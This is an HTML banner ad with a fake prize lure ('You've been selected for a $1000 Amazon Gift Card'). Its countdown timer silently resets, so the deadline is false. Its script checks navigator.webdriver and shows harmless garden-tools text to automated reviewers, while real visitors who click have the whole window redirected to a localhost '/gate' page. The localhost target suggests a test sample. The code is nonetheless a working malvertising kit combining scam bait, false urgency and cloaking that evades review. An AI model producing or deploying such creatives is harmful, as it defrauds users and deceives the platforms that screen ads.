<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sponsored</title>
<style>
  body{margin:0;font-family:Arial}
  .ad{width:300px;height:250px;background:#fff;border:1px solid #ddd;
      border-radius:8px;cursor:pointer;position:relative;overflow:hidden;text-align:center}
  .img{height:140px;background:linear-gradient(180deg,#f7d774,#f0a500);
       display:flex;align-items:center;justify-content:center;font-size:64px}
  .body{padding:12px}
  .body h3{margin:0;font-size:17px;color:#c0392b}
  .body p{margin:6px 0;font-size:12px;color:#555}
  .cta{background:#c0392b;color:#fff;padding:10px;border-radius:4px;
       font-weight:bold;font-size:14px;letter-spacing:.5px}
  .timer{background:#000;color:#0f0;font-family:monospace;padding:4px 10px;
         border-radius:4px;display:inline-block;margin:6px 0;font-size:13px}
  .adtag{position:absolute;top:6px;left:8px;font-size:9px;color:#999}
</style></head>
<body>
<div class="ad" onclick="begin()">
  <div class="adtag">Sponsored</div>
  <div class="img">&#127873;</div>
  <div class="body">
    <h3>Congratulations!</h3>
    <p>You've been selected for a $1000 Amazon Gift Card</p>
    <div class="timer" id="t">Offer expires in 04:59</div>
    <div class="cta">CLAIM YOUR PRIZE</div>
  </div>
</div>
<script>
// countdown — urgency element
let s = 299;
setInterval(() => {
  if (s <= 0) s = 299;
  const m = Math.floor(s/60), sec = s%60;
  document.getElementById("t").textContent =
    "Offer expires in 0" + m + ":" + (sec<10?"0":"") + sec;
  s--;
}, 1000);

function fingerprint() {
  return (navigator.webdriver === true) ? "bot" : "user";
}
function begin() {
  if (fingerprint() === "bot") {
    document.querySelector(".body h3").textContent = "Garden tools — best prices";
    document.querySelector(".body p").textContent = "Compare 500+ retailers instantly.";
    document.querySelector(".cta").textContent = "COMPARE PRICES";
    return;
  }
  window.top.location = "http://localhost:8081/gate?c=" + Date.now().toString(36) + "&camp=gift";
}
</script>
</body></html>
